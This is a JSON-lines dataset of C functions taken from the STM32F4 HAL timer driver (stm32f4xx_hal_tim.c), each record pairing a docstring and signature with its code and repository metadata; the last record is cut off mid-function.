{"docstring": "/**\n  * @brief  TIM DMA Capture complete callback. \n  * @param  hdma: pointer to a DMA_HandleTypeDef structure that contains\n  *                the configuration information for the specified DMA module.\n  * @retval None\n  */\n", "func_signal": "void TIM_DMACaptureCplt(DMA_HandleTypeDef *hdma)", "code": "{\n  TIM_HandleTypeDef* htim = ( TIM_HandleTypeDef* )((DMA_HandleTypeDef* )hdma)->Parent;\n  \n  htim->State= HAL_TIM_STATE_READY;\n  \n  if(hdma == htim->hdma[TIM_DMA_ID_CC1])\n  {\n    htim->Channel = HAL_TIM_ACTIVE_CHANNEL_1;\n  }\n  else if(hdma == htim->hdma[TIM_DMA_ID_CC2])\n  {\n    htim->Channel = HAL_TIM_ACTIVE_CHANNEL_2;\n  }\n  else if(hdma == htim->hdma[TIM_DMA_ID_CC3])\n  {\n    htim->Channel = HAL_TIM_ACTIVE_CHANNEL_3;\n  }\n  else if(hdma == htim->hdma[TIM_DMA_ID_CC4])\n  {\n    htim->Channel = HAL_TIM_ACTIVE_CHANNEL_4;\n  }\n  \n  HAL_TIM_IC_CaptureCallback(htim); \n  \n  htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;\n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/**\n  * @brief  Starts the TIM Encoder Interface in DMA mode.\n  * @param  htim: pointer to a TIM_HandleTypeDef structure that contains\n  *                the configuration information for TIM module.\n  * @param  Channel: TIM Channels to be enabled.\n  *          This parameter can be one of the following values:\n  *            @arg TIM_CHANNEL_1: TIM Channel 1 selected\n  *            @arg TIM_CHANNEL_2: TIM Channel 2 selected\n  *            @arg TIM_CHANNEL_ALL: TIM Channel 1 and TIM Channel 2 are selected\n  * @param  pData1: The destination Buffer address for IC1.\n  * @param  pData2: The destination Buffer address for IC2.\n  * @param  Length: The length of data to be transferred from TIM peripheral to memory.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_Encoder_Start_DMA(TIM_HandleTypeDef *htim, uint32_t Channel, uint32_t *pData1, uint32_t *pData2, uint16_t Length)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_DMA_CC_INSTANCE(htim->Instance));\n  \n  if((htim->State == HAL_TIM_STATE_BUSY))\n  {\n     return HAL_BUSY;\n  }\n  else if((htim->State == HAL_TIM_STATE_READY))\n  {\n    if((((pData1 == 0) || (pData2 == 0) )) && (Length > 0)) \n    {\n      return HAL_ERROR;                                    \n    }\n    else\n    {\n      htim->State = HAL_TIM_STATE_BUSY;\n    }\n  }  \n   \n  switch (Channel)\n  {\n    case TIM_CHANNEL_1:\n    {\n      /* Set the DMA Period elapsed callback */\n      htim->hdma[TIM_DMA_ID_CC1]->XferCpltCallback = TIM_DMACaptureCplt;\n     \n      /* Set the DMA error callback */\n      htim->hdma[TIM_DMA_ID_CC1]->XferErrorCallback = TIM_DMAError ;\n      \n      /* Enable the DMA Stream */\n      HAL_DMA_Start_IT(htim->hdma[TIM_DMA_ID_CC1], (uint32_t)&htim->Instance->CCR1, (uint32_t )pData1, Length); \n      \n      /* Enable the TIM Input Capture DMA request */      \n      __HAL_TIM_ENABLE_DMA(htim, TIM_DMA_CC1);\n            \n      /* Enable the Peripheral */\n      __HAL_TIM_ENABLE(htim);\n      \n      /* Enable the Capture compare channel */\n      TIM_CCxChannelCmd(htim->Instance, TIM_CHANNEL_1, TIM_CCx_ENABLE);\n    }\n    break;\n    \n    case TIM_CHANNEL_2:\n    {\n      /* Set the DMA Period elapsed callback */\n      htim->hdma[TIM_DMA_ID_CC2]->XferCpltCallback = TIM_DMACaptureCplt;\n     \n      /* Set the DMA error callback */\n      htim->hdma[TIM_DMA_ID_CC2]->XferErrorCallback = TIM_DMAError;\n      /* Enable the DMA Stream */\n      HAL_DMA_Start_IT(htim->hdma[TIM_DMA_ID_CC2], (uint32_t)&htim->Instance->CCR2, (uint32_t)pData2, Length);\n      \n      /* Enable the TIM Input Capture  DMA request */\n      __HAL_TIM_ENABLE_DMA(htim, TIM_DMA_CC2);\n     \n      /* Enable the Peripheral */\n      __HAL_TIM_ENABLE(htim);\n      \n      /* Enable the Capture compare channel */\n      TIM_CCxChannelCmd(htim->Instance, TIM_CHANNEL_2, TIM_CCx_ENABLE);\n    }\n    break;\n    \n    case TIM_CHANNEL_ALL:\n    {\n      /* Set the DMA Period elapsed callback */\n      htim->hdma[TIM_DMA_ID_CC1]->XferCpltCallback = TIM_DMACaptureCplt;\n     \n      /* Set the DMA error callback */\n      htim->hdma[TIM_DMA_ID_CC1]->XferErrorCallback = TIM_DMAError ;\n      \n      /* Enable the DMA Stream */\n      HAL_DMA_Start_IT(htim->hdma[TIM_DMA_ID_CC1], (uint32_t)&htim->Instance->CCR1, (uint32_t)pData1, Length);\n      \n      /* Set the DMA Period elapsed callback */\n      htim->hdma[TIM_DMA_ID_CC2]->XferCpltCallback = TIM_DMACaptureCplt;\n     \n      /* Set the DMA error callback */\n      htim->hdma[TIM_DMA_ID_CC2]->XferErrorCallback = TIM_DMAError ;\n      \n      /* Enable the DMA Stream */\n      HAL_DMA_Start_IT(htim->hdma[TIM_DMA_ID_CC2], (uint32_t)&htim->Instance->CCR2, (uint32_t)pData2, Length);\n          \n     /* Enable the Peripheral */\n      __HAL_TIM_ENABLE(htim);\n      \n      /* Enable the Capture compare channel */\n      TIM_CCxChannelCmd(htim->Instance, TIM_CHANNEL_1, TIM_CCx_ENABLE);\n      TIM_CCxChannelCmd(htim->Instance, TIM_CHANNEL_2, TIM_CCx_ENABLE);\n      \n      /* Enable the TIM Input Capture  DMA request */\n      __HAL_TIM_ENABLE_DMA(htim, TIM_DMA_CC1);\n      /* Enable the TIM Input Capture  DMA request */\n      __HAL_TIM_ENABLE_DMA(htim, TIM_DMA_CC2);\n    }\n    break;\n    \n    default:\n    break;\n  }  \n  /* Return function status */\n  return HAL_OK;\n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/**\n  * @brief  DeInitializes the TIM peripheral \n  * @param  htim: pointer to a TIM_HandleTypeDef structure that contains\n  *                the configuration information for TIM module.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_PWM_DeInit(TIM_HandleTypeDef *htim)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_INSTANCE(htim->Instance));\n  \n  htim->State = HAL_TIM_STATE_BUSY;\n  \n  /* Disable the TIM Peripheral Clock */\n  __HAL_TIM_DISABLE(htim);\n    \n  /* DeInit the low level hardware: GPIO, CLOCK, NVIC and DMA */\n  HAL_TIM_PWM_MspDeInit(htim);\n    \n  /* Change TIM state */  \n  htim->State = HAL_TIM_STATE_RESET; \n\n  /* Release Lock */\n  __HAL_UNLOCK(htim);\n\n  return HAL_OK;\n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/**\n  * @brief  Stops the TIM Encoder Interface.\n  * @param  htim: pointer to a TIM_HandleTypeDef structure that contains\n  *                the configuration information for TIM module.\n  * @param  Channel: TIM Channels to be disabled.\n  *          This parameter can be one of the following values:\n  *            @arg TIM_CHANNEL_1: TIM Channel 1 selected\n  *            @arg TIM_CHANNEL_2: TIM Channel 2 selected\n  *            @arg TIM_CHANNEL_ALL: TIM Channel 1 and TIM Channel 2 are selected\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_Encoder_Stop(TIM_HandleTypeDef *htim, uint32_t Channel)", "code": "{\n  /* Check the parameters */\n    assert_param(IS_TIM_CC2_INSTANCE(htim->Instance));\n    \n   /* Disable the Input Capture channels 1 and 2\n    (in the EncoderInterface the two possible channels that can be used are TIM_CHANNEL_1 and TIM_CHANNEL_2) */ \n  switch (Channel)\n  {\n    case TIM_CHANNEL_1:\n    {\n      TIM_CCxChannelCmd(htim->Instance, TIM_CHANNEL_1, TIM_CCx_DISABLE);\n      break; \n    }\n    case TIM_CHANNEL_2:\n    { \n      TIM_CCxChannelCmd(htim->Instance, TIM_CHANNEL_2, TIM_CCx_DISABLE); \n      break;\n    }  \n    default :\n    {\n     TIM_CCxChannelCmd(htim->Instance, TIM_CHANNEL_1, TIM_CCx_DISABLE);\n     TIM_CCxChannelCmd(htim->Instance, TIM_CHANNEL_2, TIM_CCx_DISABLE);\n     break; \n    }\n  }  \n  /* Disable the Peripheral */\n  __HAL_TIM_DISABLE(htim);\n  \n  /* Return function status */\n  return HAL_OK;\n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/**\n  * @brief  Stops the TIM DMA Burst mode \n  * @param  htim: pointer to a TIM_HandleTypeDef structure that contains\n  *                the configuration information for TIM module.\n  * @param  BurstRequestSrc: TIM DMA Request sources to disable\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_DMABurst_WriteStop(TIM_HandleTypeDef *htim, uint32_t BurstRequestSrc)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_DMA_SOURCE(BurstRequestSrc));\n  \n  /* Abort the DMA transfer (at least disable the DMA channel) */\n  switch(BurstRequestSrc)\n  {\n    case TIM_DMA_UPDATE:\n    {  \n      HAL_DMA_Abort(htim->hdma[TIM_DMA_ID_UPDATE]);\n    }\n    break;\n    case TIM_DMA_CC1:\n    {  \n      HAL_DMA_Abort(htim->hdma[TIM_DMA_ID_CC1]);\n    }\n    break;\n    case TIM_DMA_CC2:\n    {  \n      HAL_DMA_Abort(htim->hdma[TIM_DMA_ID_CC2]);\n    }\n    break;\n    case TIM_DMA_CC3:\n    {  \n      HAL_DMA_Abort(htim->hdma[TIM_DMA_ID_CC3]);\n    }\n    break;\n    case TIM_DMA_CC4:\n    {  \n      HAL_DMA_Abort(htim->hdma[TIM_DMA_ID_CC4]);\n    }\n    break;\n    case TIM_DMA_COM:\n    {  \n      HAL_DMA_Abort(htim->hdma[TIM_DMA_ID_COMMUTATION]);\n    }\n    break;\n    case TIM_DMA_TRIGGER:\n    {  \n      HAL_DMA_Abort(htim->hdma[TIM_DMA_ID_TRIGGER]);\n    }\n    break;\n    default:\n    break;\n  }\n\n  /* Disable the TIM Update DMA request */\n  __HAL_TIM_DISABLE_DMA(htim, BurstRequestSrc);\n      \n  /* Return function status */\n  return HAL_OK;  \n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/**\n  * @brief  Selects the signal connected to the TI1 input: direct from CH1_input\n  *         or a XOR combination between CH1_input, CH2_input & CH3_input\n  * @param  htim: pointer to a TIM_HandleTypeDef structure that contains\n  *                the configuration information for TIM module.\n  * @param  TI1_Selection: Indicate whether or not channel 1 is connected to the\n  *         output of a XOR gate.\n  *         This parameter can be one of the following values:\n  *            @arg TIM_TI1SELECTION_CH1: The TIMx_CH1 pin is connected to TI1 input\n  *            @arg TIM_TI1SELECTION_XORCOMBINATION: The TIMx_CH1, CH2 and CH3\n  *            pins are connected to the TI1 input (XOR combination)\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_ConfigTI1Input(TIM_HandleTypeDef *htim, uint32_t TI1_Selection)", "code": "{\n  uint32_t tmpcr2 = 0;\n  \n  /* Check the parameters */\n  assert_param(IS_TIM_XOR_INSTANCE(htim->Instance)); \n  assert_param(IS_TIM_TI1SELECTION(TI1_Selection));\n\n  /* Get the TIMx CR2 register value */\n  tmpcr2 = htim->Instance->CR2;\n\n  /* Reset the TI1 selection */\n  tmpcr2 &= ~TIM_CR2_TI1S;\n\n  /* Set the TI1 selection */\n  tmpcr2 |= TI1_Selection;\n  \n  /* Write to TIMxCR2 */\n  htim->Instance->CR2 = tmpcr2;\n\n  return HAL_OK;\n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/**\n  * @brief  Stops the TIM PWM signal generation in DMA mode.\n  * @param  htim: pointer to a TIM_HandleTypeDef structure that contains\n  *                the configuration information for TIM module.\n  * @param  Channel: TIM Channels to be disabled.\n  *          This parameter can be one of the following values:\n  *            @arg TIM_CHANNEL_1: TIM Channel 1 selected\n  *            @arg TIM_CHANNEL_2: TIM Channel 2 selected\n  *            @arg TIM_CHANNEL_3: TIM Channel 3 selected\n  *            @arg TIM_CHANNEL_4: TIM Channel 4 selected\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_PWM_Stop_DMA(TIM_HandleTypeDef *htim, uint32_t Channel)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_CCX_INSTANCE(htim->Instance, Channel));\n  \n  switch (Channel)\n  {\n    case TIM_CHANNEL_1:\n    {       \n      /* Disable the TIM Capture/Compare 1 DMA request */\n      __HAL_TIM_DISABLE_DMA(htim, TIM_DMA_CC1);\n    }\n    break;\n    \n    case TIM_CHANNEL_2:\n    {\n      /* Disable the TIM Capture/Compare 2 DMA request */\n      __HAL_TIM_DISABLE_DMA(htim, TIM_DMA_CC2);\n    }\n    break;\n    \n    case TIM_CHANNEL_3:\n    {\n      /* Disable the TIM Capture/Compare 3 DMA request */\n      __HAL_TIM_DISABLE_DMA(htim, TIM_DMA_CC3);\n    }\n    break;\n    \n    case TIM_CHANNEL_4:\n    {\n      /* Disable the TIM Capture/Compare 4 interrupt */\n      __HAL_TIM_DISABLE_DMA(htim, TIM_DMA_CC4);\n    }\n    break;\n    \n    default:\n    break;\n  } \n  \n  /* Disable the Capture compare channel */\n  TIM_CCxChannelCmd(htim->Instance, Channel, TIM_CCx_DISABLE);\n  \n  if(IS_TIM_ADVANCED_INSTANCE(htim->Instance) != RESET)  \n  {\n    /* Disable the Main Output */\n    __HAL_TIM_MOE_DISABLE(htim);\n  }\n  \n  /* Disable the Peripheral */\n  __HAL_TIM_DISABLE(htim);\n  \n  /* Change the htim state */\n  htim->State = HAL_TIM_STATE_READY;\n  \n  /* Return function status */\n  return HAL_OK;\n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/**\n  * @brief  Starts the TIM Encoder Interface in interrupt mode.\n  * @param  htim: pointer to a TIM_HandleTypeDef structure that contains\n  *                the configuration information for TIM module.\n  * @param  Channel: TIM Channels to be enabled.\n  *          This parameter can be one of the following values:\n  *            @arg TIM_CHANNEL_1: TIM Channel 1 selected\n  *            @arg TIM_CHANNEL_2: TIM Channel 2 selected\n  *            @arg TIM_CHANNEL_ALL: TIM Channel 1 and TIM Channel 2 are selected\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_Encoder_Start_IT(TIM_HandleTypeDef *htim, uint32_t Channel)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_CC2_INSTANCE(htim->Instance));\n  \n  /* Enable the encoder interface channels */\n  /* Enable the capture compare Interrupts 1 and/or 2 */\n  switch (Channel)\n  {\n    case TIM_CHANNEL_1:\n    {\n      TIM_CCxChannelCmd(htim->Instance, TIM_CHANNEL_1, TIM_CCx_ENABLE);\n      __HAL_TIM_ENABLE_IT(htim, TIM_IT_CC1);\n      break; \n    }\n    case TIM_CHANNEL_2:\n    { \n      TIM_CCxChannelCmd(htim->Instance, TIM_CHANNEL_2, TIM_CCx_ENABLE);\n      __HAL_TIM_ENABLE_IT(htim, TIM_IT_CC2); \n      break;\n    }  \n    default :\n    {\n     TIM_CCxChannelCmd(htim->Instance, TIM_CHANNEL_1, TIM_CCx_ENABLE);\n     TIM_CCxChannelCmd(htim->Instance, TIM_CHANNEL_2, TIM_CCx_ENABLE);\n     __HAL_TIM_ENABLE_IT(htim, TIM_IT_CC1);\n     __HAL_TIM_ENABLE_IT(htim, TIM_IT_CC2);\n     break; \n    }\n  }\n  \n  /* Enable the Peripheral */\n  __HAL_TIM_ENABLE(htim);\n  \n  /* Return function status */\n  return HAL_OK;\n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/**\n  * @brief  Starts the TIM Output Compare signal generation in DMA mode.\n  * @param  htim: pointer to a TIM_HandleTypeDef structure that contains\n  *                the configuration information for TIM module.\n  * @param  Channel: TIM Channel to be enabled.\n  *          This parameter can be one of the following values:\n  *            @arg TIM_CHANNEL_1: TIM Channel 1 selected\n  *            @arg TIM_CHANNEL_2: TIM Channel 2 selected\n  *            @arg TIM_CHANNEL_3: TIM Channel 3 selected\n  *            @arg TIM_CHANNEL_4: TIM Channel 4 selected\n  * @param  pData: The source Buffer address.\n  * @param  Length: The length of data to be transferred from memory to TIM peripheral\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_OC_Start_DMA(TIM_HandleTypeDef *htim, uint32_t Channel, uint32_t *pData, uint16_t Length)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_CCX_INSTANCE(htim->Instance, Channel));\n  \n  if((htim->State == HAL_TIM_STATE_BUSY))\n  {\n     return HAL_BUSY;\n  }\n  else if((htim->State == HAL_TIM_STATE_READY))\n  {\n    if(((uint32_t)pData == 0 ) && (Length > 0)) \n    {\n      return HAL_ERROR;                                    \n    }\n    else\n    {\n      htim->State = HAL_TIM_STATE_BUSY;\n    }\n  }    \n  switch (Channel)\n  {\n    case TIM_CHANNEL_1:\n    {      \n      /* Set the DMA Period elapsed callback */\n      htim->hdma[TIM_DMA_ID_CC1]->XferCpltCallback = TIM_DMADelayPulseCplt;\n     \n      /* Set the DMA error callback */\n      htim->hdma[TIM_DMA_ID_CC1]->XferErrorCallback = TIM_DMAError ;\n      \n      /* Enable the DMA Stream */\n      HAL_DMA_Start_IT(htim->hdma[TIM_DMA_ID_CC1], (uint32_t)pData, (uint32_t)&htim->Instance->CCR1, Length);\n      \n      /* Enable the TIM Capture/Compare 1 DMA request */\n      __HAL_TIM_ENABLE_DMA(htim, TIM_DMA_CC1);\n    }\n    break;\n    \n    case TIM_CHANNEL_2:\n    {\n      /* Set the DMA Period elapsed callback */\n      htim->hdma[TIM_DMA_ID_CC2]->XferCpltCallback = TIM_DMADelayPulseCplt;\n     \n      /* Set the DMA error callback */\n      htim->hdma[TIM_DMA_ID_CC2]->XferErrorCallback = TIM_DMAError ;\n      \n      /* Enable the DMA Stream */\n      HAL_DMA_Start_IT(htim->hdma[TIM_DMA_ID_CC2], (uint32_t)pData, (uint32_t)&htim->Instance->CCR2, Length);\n      \n      /* Enable the TIM Capture/Compare 2 DMA request */\n      __HAL_TIM_ENABLE_DMA(htim, TIM_DMA_CC2);\n    }\n    break;\n    \n    case TIM_CHANNEL_3:\n    {\n      /* Set the DMA Period elapsed callback */\n      htim->hdma[TIM_DMA_ID_CC3]->XferCpltCallback = TIM_DMADelayPulseCplt;\n     \n      /* Set the DMA error callback */\n      htim->hdma[TIM_DMA_ID_CC3]->XferErrorCallback = TIM_DMAError ;\n      \n      /* Enable the DMA Stream */\n      HAL_DMA_Start_IT(htim->hdma[TIM_DMA_ID_CC3], (uint32_t)pData, (uint32_t)&htim->Instance->CCR3,Length);\n      \n      /* Enable the TIM Capture/Compare 3 DMA request */\n      __HAL_TIM_ENABLE_DMA(htim, TIM_DMA_CC3);\n    }\n    break;\n    \n    case TIM_CHANNEL_4:\n    {\n     /* Set the DMA Period elapsed callback */\n      htim->hdma[TIM_DMA_ID_CC4]->XferCpltCallback = TIM_DMADelayPulseCplt;\n     \n      /* Set the DMA error callback */\n      htim->hdma[TIM_DMA_ID_CC4]->XferErrorCallback = TIM_DMAError ;\n      \n      /* Enable the DMA Stream */\n      HAL_DMA_Start_IT(htim->hdma[TIM_DMA_ID_CC4], (uint32_t)pData, (uint32_t)&htim->Instance->CCR4, Length);\n      \n      /* Enable the TIM Capture/Compare 4 DMA request */\n      __HAL_TIM_ENABLE_DMA(htim, TIM_DMA_CC4);\n    }\n    break;\n    \n    default:\n    break;\n  }\n\n  /* Enable the Output compare channel */\n  TIM_CCxChannelCmd(htim->Instance, Channel, TIM_CCx_ENABLE);\n  \n  if(IS_TIM_ADVANCED_INSTANCE(htim->Instance) != RESET)  \n  {\n    /* Enable the main output */\n    __HAL_TIM_MOE_ENABLE(htim);\n  }  \n  \n  /* Enable the Peripheral */\n  __HAL_TIM_ENABLE(htim); \n  \n  /* Return function status */\n  return HAL_OK;\n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/**\n  * @brief  Stops the TIM Output Compare signal generation in interrupt mode.\n  * @param  htim: pointer to a TIM_HandleTypeDef structure that contains\n  *                the configuration information for TIM module.\n  * @param  Channel: TIM Channel to be disabled.\n  *          This parameter can be one of the following values:\n  *            @arg TIM_CHANNEL_1: TIM Channel 1 selected\n  *            @arg TIM_CHANNEL_2: TIM Channel 2 selected\n  *            @arg TIM_CHANNEL_3: TIM Channel 3 selected\n  *            @arg TIM_CHANNEL_4: TIM Channel 4 selected\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_OC_Stop_IT(TIM_HandleTypeDef *htim, uint32_t Channel)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_CCX_INSTANCE(htim->Instance, Channel));\n  \n  switch (Channel)\n  {\n    case TIM_CHANNEL_1:\n    {       \n      /* Disable the TIM Capture/Compare 1 interrupt */\n      __HAL_TIM_DISABLE_IT(htim, TIM_IT_CC1);\n    }\n    break;\n    \n    case TIM_CHANNEL_2:\n    {\n      /* Disable the TIM Capture/Compare 2 interrupt */\n      __HAL_TIM_DISABLE_IT(htim, TIM_IT_CC2);\n    }\n    break;\n    \n    case TIM_CHANNEL_3:\n    {\n      /* Disable the TIM Capture/Compare 3 interrupt */\n      __HAL_TIM_DISABLE_IT(htim, TIM_IT_CC3);\n    }\n    break;\n    \n    case TIM_CHANNEL_4:\n    {\n      /* Disable the TIM Capture/Compare 4 interrupt */\n      __HAL_TIM_DISABLE_IT(htim, TIM_IT_CC4);\n    }\n    break;\n    \n    default:\n    break; \n  } \n  \n  /* Disable the Output compare channel */\n  TIM_CCxChannelCmd(htim->Instance, Channel, TIM_CCx_DISABLE); \n  \n  if(IS_TIM_ADVANCED_INSTANCE(htim->Instance) != RESET)  \n  {\n    /* Disable the Main Output */\n    __HAL_TIM_MOE_DISABLE(htim);\n  }\n  \n  /* Disable the Peripheral */\n  __HAL_TIM_DISABLE(htim);  \n  \n  /* Return function status */\n  return HAL_OK;\n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/**\n  * @brief  Stops the TIM Output Compare signal generation.\n  * @param  htim: pointer to a TIM_HandleTypeDef structure that contains\n  *                the configuration information for TIM module.\n  * @param  Channel: TIM Channel to be disabled.\n  *          This parameter can be one of the following values:\n  *            @arg TIM_CHANNEL_1: TIM Channel 1 selected\n  *            @arg TIM_CHANNEL_2: TIM Channel 2 selected\n  *            @arg TIM_CHANNEL_3: TIM Channel 3 selected\n  *            @arg TIM_CHANNEL_4: TIM Channel 4 selected\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_OC_Stop(TIM_HandleTypeDef *htim, uint32_t Channel)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_CCX_INSTANCE(htim->Instance, Channel));\n  \n  /* Disable the Output compare channel */\n  TIM_CCxChannelCmd(htim->Instance, Channel, TIM_CCx_DISABLE);\n  \n  if(IS_TIM_ADVANCED_INSTANCE(htim->Instance) != RESET)  \n  {\n    /* Disable the Main Output */\n    __HAL_TIM_MOE_DISABLE(htim);\n  }  \n  \n  /* Disable the Peripheral */\n  __HAL_TIM_DISABLE(htim);  \n  \n  /* Return function status */\n  return HAL_OK;\n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/**\n  * @brief  Stops the TIM Input Capture measurement in interrupt mode.\n  * @param  htim: pointer to a TIM_HandleTypeDef structure that contains\n  *                the configuration information for TIM module.\n  * @param  Channel: TIM Channels to be disabled.\n  *          This parameter can be one of the following values:\n  *            @arg TIM_CHANNEL_1: TIM Channel 1 selected\n  *            @arg TIM_CHANNEL_2: TIM Channel 2 selected\n  *            @arg TIM_CHANNEL_3: TIM Channel 3 selected\n  *            @arg TIM_CHANNEL_4: TIM Channel 4 selected\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_IC_Stop_IT(TIM_HandleTypeDef *htim, uint32_t Channel)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_CCX_INSTANCE(htim->Instance, Channel));\n  \n  switch (Channel)\n  {\n    case TIM_CHANNEL_1:\n    {       \n      /* Disable the TIM Capture/Compare 1 interrupt */\n      __HAL_TIM_DISABLE_IT(htim, TIM_IT_CC1);\n    }\n    break;\n    \n    case TIM_CHANNEL_2:\n    {\n      /* Disable the TIM Capture/Compare 2 interrupt */\n      __HAL_TIM_DISABLE_IT(htim, TIM_IT_CC2);\n    }\n    break;\n    \n    case TIM_CHANNEL_3:\n    {\n      /* Disable the TIM Capture/Compare 3 interrupt */\n      __HAL_TIM_DISABLE_IT(htim, TIM_IT_CC3);\n    }\n    break;\n    \n    case TIM_CHANNEL_4:\n    {\n      /* Disable the TIM Capture/Compare 4 interrupt */\n      __HAL_TIM_DISABLE_IT(htim, TIM_IT_CC4);\n    }\n    break;\n    \n    default:\n    break; \n  } \n  \n  /* Disable the Input Capture channel */\n  TIM_CCxChannelCmd(htim->Instance, Channel, TIM_CCx_DISABLE); \n  \n  /* Disable the Peripheral */\n  __HAL_TIM_DISABLE(htim); \n  \n  /* Return function status */\n  return HAL_OK;\n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/**\n  * @brief  Stops the TIM One Pulse signal generation.\n  * @param  htim: pointer to a TIM_HandleTypeDef structure that contains\n  *                the configuration information for TIM module.\n  * @param  OutputChannel : TIM Channels to be disable.\n  *          This parameter can be one of the following values:\n  *            @arg TIM_CHANNEL_1: TIM Channel 1 selected\n  *            @arg TIM_CHANNEL_2: TIM Channel 2 selected\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_OnePulse_Stop(TIM_HandleTypeDef *htim, uint32_t OutputChannel)", "code": "{\n  /* Disable the Capture compare and the Input Capture channels \n  (in the OPM Mode the two possible channels that can be used are TIM_CHANNEL_1 and TIM_CHANNEL_2)\n  if TIM_CHANNEL_1 is used as output, the TIM_CHANNEL_2 will be used as input and\n  if TIM_CHANNEL_1 is used as input, the TIM_CHANNEL_2 will be used as output \n  in all combinations, the TIM_CHANNEL_1 and TIM_CHANNEL_2 should be disabled together */\n  \n  TIM_CCxChannelCmd(htim->Instance, TIM_CHANNEL_1, TIM_CCx_DISABLE); \n  TIM_CCxChannelCmd(htim->Instance, TIM_CHANNEL_2, TIM_CCx_DISABLE); \n    \n  if(IS_TIM_ADVANCED_INSTANCE(htim->Instance) != RESET)  \n  {\n    /* Disable the Main Output */\n    __HAL_TIM_MOE_DISABLE(htim);\n  }\n    \n  /* Disable the Peripheral */\n  __HAL_TIM_DISABLE(htim); \n  \n  /* Return function status */\n  return HAL_OK;\n}", "path": "Downstream\\Drivers\\STM32F4xx_HAL_Driver\\Src\\stm32f4xx_hal_tim.c", "repo_name": "robertfisk/USG", "stars": 400, "license": "other", "language": "c", "size": 4474}
{"docstring": "/**\n  * @brief  Configures the TIM in Slave mode in interrupt mode\n  * @param  htim: TIM handle.\n  * @param  sSlaveConfig: pointer to a TIM_SlaveConfigTypeDef structure that\n  *         contains the selected trigger (internal trigger input, filtered\n  *         timer input or external trigger input) and the ) and the Slave \n  *         mode (Disable, Reset, Gated, Trigger, External clock mode 1). \n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_TIM_SlaveConfigSynchronization_IT(TIM_HandleTypeDef *htim, \n                                                        TIM_SlaveConfigTypeDef * sSlaveConfig)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_SLAVE_INSTANCE(htim->Instance));\n  assert_param(IS_TIM_SLAVE_MODE(sSlaveConfig->SlaveMode));\n  assert_param(IS_TIM_TRIGGER_SELECTION(sSlaveConfig->InputTrigger));\n  \n  __HAL_LOCK(htim);\n\n  htim->State = HAL_TIM_STATE_BUSY;\n  \n  TIM_SlaveTimer_SetConfig(htim, sSlaveConfig);\n  \n  /* Enable Trigger Interrupt */\n  __HAL_TIM_ENABLE_IT(htim, 